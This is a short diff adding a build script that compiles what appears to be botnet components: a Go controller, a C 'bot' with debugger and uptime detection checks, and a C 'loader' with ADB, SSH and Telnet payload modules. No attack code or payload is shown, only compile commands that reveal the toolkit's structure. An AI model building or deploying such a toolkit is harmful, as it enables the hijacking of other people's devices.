@@ -1,0 +1,3 @@
+go build ivy.go
+gcc -o bot util/bot/bot.c util/bot/util/socket/socket.c util/bot/util/socket/handler.c util/bot/util/detection/cpu.c util/bot/util/detection/debug.c util/bot/util/detection/uptime.c
+gcc -o loader util/loader/loader.c util/loader/util/adb/connect.c util/loader/util/adb/load.c util/loader/util/adb/payload.c util/loader/util/io/handler.c util/loader/util/parser/read.c util/loader/util/parser/parse.c util/loader/util/ssh/connect.c util/loader/util/ssh/payload.c util/loader/util/telnet/connect.c util/loader/util/telnet/payload.c -lssh
